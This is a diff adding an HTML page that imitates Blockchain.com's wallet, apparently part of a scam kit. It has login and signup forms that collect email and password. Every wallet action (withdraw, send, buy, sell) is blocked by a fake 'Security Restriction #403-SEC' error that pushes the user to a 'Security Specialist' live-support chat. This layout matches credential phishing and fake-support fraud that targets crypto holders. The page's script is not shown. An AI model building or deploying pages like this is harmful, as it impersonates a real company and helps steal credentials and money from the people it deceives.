@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Blockchain.com — Web3 Wallet</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com/3.4.17"></script>
+<link rel="stylesheet" href="style.css">
+</head>
+<body class="min-h-screen" data-page="client">
+
+<!-- ===================== AUTH VIEW ===================== -->
+<section id="view-auth" class="view active min-h-screen flex flex-col justify-between px-5 py-8">
+  <div class="flex items-center justify-center gap-2.5 pt-4">
+    <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+      <rect width="32" height="32" rx="8" fill="#0C6CF2"/>
+      <path d="M16 6L24.66 11V21L16 26L7.34 21V11L16 6Z" stroke="white" stroke-width="2" stroke-linejoin="round"/>
+      <path d="M16 16L24.66 11M16 16V26M16 16L7.34 11" stroke="white" stroke-width="2" stroke-linejoin="round"/>
+    </svg>
+    <span class="text-xl font-bold tracking-tight">Blockchain<span class="text-[#0C6CF2]">.com</span></span>
+  </div>
+
+  <div class="w-full max-w-md mx-auto my-auto py-8">
+    <div class="card p-6 sm:p-8">
+      <div class="flex gap-6 border-b mb-6" style="border-color:var(--border)">
+        <button id="tab-signin" onclick="setAuthTab('signin')" class="tab-btn active pb-3 text-sm font-semibold">Log In</button>
+        <button id="tab-signup" onclick="setAuthTab('signup')" class="tab-btn pb-3 text-sm font-semibold">Create Account</button>
+      </div>
+
+      <!-- Sign In Form -->
+      <form id="form-signin" novalidate onsubmit="return handleAuth(event,'signin')" class="space-y-4">
+        <div>
+          <label class="text-xs font-medium text-[var(--muted)] uppercase tracking-wider mb-1.5 block">Email Address</label>
+          <input type="email" id="si-email" placeholder="name@example.com" class="input w-full px-3.5 py-2.5 text-sm" required>
+          <p class="err-text text-xs mt-1 hidden" id="si-email-err">Please enter a valid email.</p>
+        </div>
+        <div>
+          <label class="text-xs font-medium text-[var(--muted)] uppercase tracking-wider mb-1.5 block">Password</label>
+          <input type="password" id="si-pass" placeholder="••••••••" class="input w-full px-3.5 py-2.5 text-sm" required>
+          <p class="err-text text-xs mt-1 hidden" id="si-pass-err">Password must be at least 6 characters.</p>
+        </div>
+        <button type="submit" class="btn btn-primary w-full py-3 text-sm mt-2">Log In to Wallet</button>
+      </form>
+
+      <!-- Sign Up Form -->
+      <form id="form-signup" novalidate onsubmit="return handleAuth(event,'signup')" class="space-y-4 hidden">
+        <div>
+          <label class="text-xs font-medium text-[var(--muted)] uppercase tracking-wider mb-1.5 block">Email Address</label>
+          <input type="email" id="su-email" placeholder="name@example.com" class="input w-full px-3.5 py-2.5 text-sm" required>
+          <p class="err-text text-xs mt-1 hidden" id="su-email-err">Please enter a valid email.</p>
+        </div>
+        <div>
+          <label class="text-xs font-medium text-[var(--muted)] uppercase tracking-wider mb-1.5 block">Create Password</label>
+          <input type="password" id="su-pass" placeholder="Min. 6 characters" class="input w-full px-3.5 py-2.5 text-sm" required>
+          <p class="err-text text-xs mt-1 hidden" id="su-pass-err">Password must be at least 6 characters.</p>
+        </div>
+        <button type="submit" class="btn btn-primary w-full py-3 text-sm mt-2">Register New Wallet</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="text-center text-xs text-[var(--muted)]">
+    <span>256-bit SSL Encrypted • Supabase Auth Secured</span>
+  </div>
+</section>
+
+<!-- ===================== CLIENT DASHBOARD VIEW ===================== -->
+<section id="view-dashboard" class="view min-h-screen">
+  <header class="sticky top-0 z-30 flex items-center justify-between px-5 sm:px-8 py-3.5 border-b bg-[#0B0E14]/90 backdrop-blur-md" style="border-color:var(--border)">
+    <div class="flex items-center gap-6">
+      <div class="flex items-center gap-2.5">
+        <svg width="28" height="28" viewBox="0 0 32 32" fill="none">
+          <rect width="32" height="32" rx="7" fill="#0C6CF2"/>
+          <path d="M16 6L24.66 11V21L16 26L7.34 21V11L16 6Z" stroke="white" stroke-width="2" stroke-linejoin="round"/>
+          <path d="M16 16L24.66 11M16 16V26M16 16L7.34 11" stroke="white" stroke-width="2" stroke-linejoin="round"/>
+        </svg>
+        <span class="font-bold tracking-tight text-base">Blockchain<span class="text-[#0C6CF2]">.com</span></span>
+      </div>
+      <nav class="hidden md:flex items-center gap-5 text-sm font-medium">
+        <span class="text-white border-b-2 border-[#0C6CF2] py-1">Portfolio</span>
+        <span onclick="openRestrictedAction('Prices')" class="text-[var(--muted)] hover:text-white cursor-pointer">Prices</span>
+        <span onclick="openRestrictedAction('Transfers')" class="text-[var(--muted)] hover:text-white cursor-pointer">Transfers</span>
+      </nav>
+    </div>
+
+    <div class="flex items-center gap-3">
+      <button onclick="openChat()" class="btn btn-ghost px-3 py-1.5 text-xs flex items-center gap-2">
+        <span class="w-2 h-2 rounded-full bg-[#00C875] animate-pulse"></span>
+        <span>Live Support</span>
+      </button>
+      <div class="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-full bg-[var(--surface)] border border-[var(--border)]">
+        <span class="mono text-xs text-[var(--muted)]" id="wallet-addr">0x7fA9...4e21</span>
+      </div>
+      <button onclick="logout()" title="Log out" class="w-8 h-8 rounded-full flex items-center justify-center font-bold text-xs bg-[#0C6CF2]/20 text-[#3B82F6] border border-[#0C6CF2]/40 hover:bg-[#0C6CF2]/30" id="user-avatar">A</button>
+    </div>
+  </header>
+
+  <main class="px-5 sm:px-8 py-6 max-w-5xl mx-auto space-y-6">
+    <!-- Welcome Greeting Header -->
+    <div class="flex items-center justify-between">
+      <div>
+        <h2 class="text-xl sm:text-2xl font-bold">Welcome back, <span id="welcome-username" class="text-[#0C6CF2]">User</span>!</h2>
+        <p class="text-xs text-[var(--muted)]">Your decentralized Web3 session is secure and encrypted.</p>
+      </div>
+    </div>
+
+    <!-- Portfolio Balance Card -->
+    <div class="card p-6 sm:p-7">
+      <div>
+        <div class="flex items-center gap-2">
+          <p class="text-xs font-semibold uppercase tracking-wider text-[var(--muted)]">Total Portfolio Balance</p>
+          <span class="px-2 py-0.5 text-[10px] font-semibold rounded bg-[#00C875]/10 text-[#00C875]">LIVE FEED</span>
+        </div>
+        <div class="flex items-baseline gap-3 mt-1.5 flex-wrap">
+          <h1 class="text-3xl sm:text-4xl font-extrabold mono tracking-tight" id="total-balance">$0.00</h1>
+          <span class="up text-xs font-semibold bg-[#00C875]/10 px-2 py-0.5 rounded-md">▲ +4.82% (24h)</span>
+        </div>
+      </div>
+
+      <!-- Action Buttons -->
+      <div class="grid grid-cols-2 sm:grid-cols-5 gap-2.5 mt-6 pt-5 border-t" style="border-color:var(--border)">
+        <button onclick="openRestrictedAction('Withdraw')" class="btn btn-primary py-2.5 text-sm flex items-center justify-center gap-1.5"><span>↗</span> Withdraw</button>
+        <button onclick="openRestrictedAction('Send')" class="btn btn-ghost py-2.5 text-sm flex items-center justify-center gap-1.5"><span>⇄</span> Send</button>
+        <button onclick="openRestrictedAction('Buy')" class="btn btn-ghost py-2.5 text-sm flex items-center justify-center gap-1.5"><span>＋</span> Buy</button>
+        <button onclick="openRestrictedAction('Sell')" class="btn btn-ghost py-2.5 text-sm flex items-center justify-center gap-1.5"><span>−</span> Sell</button>
+        <button onclick="openRestrictedAction('Receive')" class="btn btn-ghost py-2.5 text-sm col-span-2 sm:col-span-1 flex items-center justify-center gap-1.5"><span>⇣</span> Receive</button>
+      </div>
+    </div>
+
+    <!-- Multi-Coin Trust Wallet Style Asset List -->
+    <div class="card overflow-hidden">
+      <div class="px-6 py-4 border-b flex items-center justify-between" style="border-color:var(--border)">
+        <h2 class="font-bold text-sm">Crypto Assets &amp; Tokens</h2>
+        <span class="text-xs text-[var(--muted)]">Live Coin Feed</span>
+      </div>
+      <div id="asset-list" class="divide-y" style="border-color:var(--border)"></div>
+    </div>
+  </main>
+</section>
+
+<!-- ===================== UNIVERSAL ERROR MODAL ===================== -->
+<div id="modal-error" class="fixed inset-0 overlay hidden items-center justify-center p-4 z-50">
+  <div class="card modal-pop w-full max-w-md p-6 text-center border-[#F24957]/40">
+    <div class="w-14 h-14 rounded-full mx-auto mb-4 flex items-center justify-center" style="background:rgba(242,73,87,0.14);color:var(--red)">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        <line x1="12" y1="8" x2="12" y2="12"/>
+        <line x1="12" y1="16" x2="12.01" y2="16"/>
+      </svg>
+    </div>
+    <span class="px-2.5 py-1 text-[10px] font-bold uppercase tracking-wider rounded-full bg-[#F24957]/15 text-[#F24957]">Security Restriction • Error Code #403-SEC</span>
+    <h3 class="font-bold text-lg mt-3 mb-2">Something Went Wrong</h3>
+    <p class="text-sm text-[var(--muted)] leading-relaxed mb-5" id="error-detail">
+      An unexpected security error occurred while processing this transaction. Please contact support immediately to resolve this issue and proceed with your withdrawal.
+    </p>
+    <div class="flex flex-col sm:flex-row gap-2.5">
+      <button onclick="closeModal('modal-error')" class="btn btn-ghost flex-1 py-2.5 text-sm">Dismiss</button>
+      <button onclick="triggerSupportFromError()" class="btn btn-primary flex-1 py-2.5 text-sm flex items-center justify-center gap-2">
+        <span>💬</span> Contact Support
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Trust Wallet-Style Live Support Chat Drawer -->
+<div id="chat-overlay" class="fixed inset-0 overlay hidden z-50" onclick="closeChat()"></div>
+<aside id="chat-drawer" class="drawer fixed top-0 right-0 h-full w-full sm:w-[400px] z-50 flex flex-col" style="background:var(--surface);border-left:1px solid var(--border)">
+  <div class="flex items-center justify-between px-5 py-4 bg-[#0C6CF2] text-white">
+    <div class="flex items-center gap-3">
+      <div class="w-10 h-10 rounded-full bg-white/15 flex items-center justify-center">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      </div>
+      <div>
+        <p class="font-bold text-sm leading-tight">Blockchain Support Desk</p>
+        <p class="text-xs text-blue-100 flex items-center gap-1.5 mt-0.5"><span class="w-2 h-2 rounded-full bg-[#00E6A0]"></span> Security Specialist Online</p>
+      </div>
+    </div>
+    <button onclick="closeChat()" class="text-white/80 hover:text-white text-2xl leading-none">×</button>
+  </div>
+  <div id="chat-messages" class="flex-1 px-4 py-4 space-y-3 overflow-y-auto bg-[#0E131D]"></div>
+  <div class="px-4 py-2 border-t flex gap-2 overflow-x-auto bg-[var(--surface)]" style="border-color:var(--border)">
+    <button onclick="sendQuickReply('Help with withdrawal error')" class="shrink-0 text-xs px-3 py-1.5 rounded-full bg-[var(--surface-2)] border border-[var(--border)] text-[var(--text)]">Withdrawal error</button>
+    <button onclick="sendQuickReply('Error #403-SEC help')" class="shrink-0 text-xs px-3 py-1.5 rounded-full bg-[var(--surface-2)] border border-[var(--border)] text-[var(--text)]">Error #403-SEC</button>
+  </div>
+  <form novalidate onsubmit="return sendChatMessage(event)" class="px-4 py-3 border-t flex gap-2 bg-[var(--surface)]" style="border-color:var(--border)">
+    <input id="chat-input" placeholder="Write a message to support..." class="input flex-1 px-3.5 py-2.5 text-sm" autocomplete="off">
+    <button type="submit" class="btn btn-primary px-4 py-2.5 text-sm">Send</button>
+  </form>
+</aside>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="script.js"></script>
+</body>
+</html>
